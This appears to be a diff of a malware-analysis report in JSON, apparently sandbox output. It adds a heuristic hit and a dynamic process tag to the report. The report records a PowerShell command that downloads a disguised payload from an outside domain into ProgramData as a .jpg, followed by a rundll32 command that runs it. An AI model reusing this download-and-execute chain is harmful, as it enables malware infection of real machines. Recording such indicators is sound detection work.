@@ -110,6 +110,13 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "rundll32 c:\\programdata\\PNwK.jpg init"
+              ]
+            }
+          },
           "network": {
             "static": {
               "uri": [
@@ -163,6 +170,13 @@
           "heur_id": 5,
           "signatures": [],
           "value": "powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\programdata\\PNwK.jpg"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [
+            "internet_download"
+          ],
+          "value": "rundll32 c:\\programdata\\PNwK.jpg init"
         }
       ],
       "network.static.uri": [
